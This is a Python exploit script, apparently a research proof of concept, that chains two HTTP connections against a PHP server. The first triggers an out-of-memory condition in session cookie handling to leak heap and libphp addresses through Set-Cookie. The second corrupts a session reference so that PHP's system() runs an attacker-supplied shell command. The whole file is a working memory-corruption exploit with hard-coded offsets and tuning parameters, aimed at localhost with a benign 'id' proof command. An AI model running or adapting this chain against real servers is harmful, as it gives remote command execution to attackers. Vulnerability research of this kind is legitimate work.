#!/usr/bin/env python3
"""fullchain.py — A -> leak(both bases) -> fire on one box, network only.

conn1: arm1 (NUL sid, OOM inside php_session_send_cookie) + chain9 consumer
       -> Set-Cookie with CHUNK_BASE and LIBPHP_BASE; conn1 is HELD OPEN so its
       child stays busy and conn2 gets a fresh child.
conn2: arm2 long-header (nlong=3820, nh1=1295150: OOM after track_init with the
       stale reference at MAIN+0xf4798) + fire consumer (carriers = fake
       reference/array blob + header flood + END-event session fields)
       -> zval_ptr_dtor(&PS(http_session_vars)) -> zif_system(cmd).

R0 = leaked CHUNK + K + 0xf4798, K = MAIN_CHUNK - CHUNK = 0xBE00000 (measured in
two ASLR generations); table = R0 + 0x18; system = LIBPHP + 0x430870.
"""
import argparse, json, os, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import drive as D
import chain72 as C

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=7212)
    ap.add_argument("--nlong", type=int, default=3820)
    ap.add_argument("--nh1", type=int, default=1295150)
    ap.add_argument("--ncarrier", type=int, default=400)
    ap.add_argument("--flood", type=int, default=1260000)
    ap.add_argument("--cool", type=int, default=0)
    ap.add_argument("--k", type=lambda x: int(x, 0), default=0xBE00000)
    ap.add_argument("--kref", type=lambda x: int(x, 0), default=0xBEF4798)
    ap.add_argument("--krefs", default="", help="comma list; one attempt per candidate")
    ap.add_argument("--cmd", default="id>/tmp/p72proof;id>>/tmp/p72proof")
    ap.add_argument("--json", default="")
    a = ap.parse_args()
    out = {"port": a.port}
    # ---- stage 1: leak
    c1 = D.Conn("127.0.0.1", a.port, False)
    arm = D.arm_body(1299780, b"a:\n", b"\x00")
    r = c1.post("/index.php", arm, False, maxread=65536)
    out["arm1"] = {"status": r["status"], "wire": len(arm),
                   "trip": "Allowed memory size" in r["body"].decode("latin-1"),
                   "closed": r["closed"]}
    time.sleep(0.4)
    cons = D.chain9_body(614000, 40, 1, 77, 60000, 84000, 82000, payhdr=0)
    r = c1.post("/index.php", cons, False, maxread=8 << 20)
    sc = r["headers"].get("set-cookie", "")
    out["leak"] = {"status": r["status"], "wire": len(cons), "sc": len(sc),
                   "closed": r["closed"]}
    open("cookie72_full.hex", "w").write(("Set-Cookie: " + sc).encode().hex())
    if not sc:
        out["error"] = "no cookie"
        print(json.dumps(out, indent=1))
        return
    dec = C.decode("cookie72_full.hex")
    out["decode"] = {"chunk": hex(dec["chunk"]) if dec["chunk"] else None,
                     "libphp": [(hex(b), n) for b, n in dec["libphp"]],
                     "votes": [(hex(b), n) for b, n in dec["votes"]], "ht": dec["ht"]}
    if not dec["libphp"]:
        out["error"] = "libphp missing"
        print(json.dumps(out, indent=1))
        return
    main_chunk = dec["chunk"] + a.k
    system = dec["libphp"][0][0] + 0x430870
    out.update(main=hex(main_chunk), system=hex(system))
    out["main_k"] = hex(a.k)
    krefs = [int(x, 0) for x in a.krefs.split(",") if x.strip()] if a.krefs else [a.kref]
    # ---- stage 2: fire, one attempt per candidate on a fresh connection/child
    out["attempts"] = []
    for kref in krefs:
        ref = dec["chunk"] + kref
        table = ref + 0x18
        c2 = D.Conn("127.0.0.1", a.port, False)
        att = {"kref": hex(kref), "ref": hex(ref), "table": hex(table)}
        try:
            ab = C.arm2_long_body(a.nh1, 1000, a.nlong, b"a" * 32)
            r = c2.post("/index.php", ab, False, maxread=65536)
            att["arm2"] = {"status": r["status"], "wire": len(ab),
                           "trip": "Allowed memory size" in r["body"].decode("latin-1"),
                           "closed": r["closed"]}
            time.sleep(0.4)
            cmd = a.cmd.format(kref=hex(kref)) if "{kref}" in a.cmd else a.cmd
            att["cmd"] = cmd
            fb = C.fire_body(a.ncarrier, table, system, cmd.encode(), flood=a.flood,
                             tail=True, primlen=82000)
            r = c2.post("/index.php", fb, False, maxread=1 << 20)
            att["fire"] = {"status": r["status"], "wire": len(fb),
                           "body": r["body"][:120].decode("latin-1", "replace"),
                           "closed": r["closed"]}
        finally:
            c2.close()
        out["attempts"].append(att)
        time.sleep(0.3)
    c1.close()
    print(json.dumps(out, indent=1))
    if a.json:
        open(a.json, "w").write(json.dumps(out, indent=1))

if __name__ == "__main__":
    main()
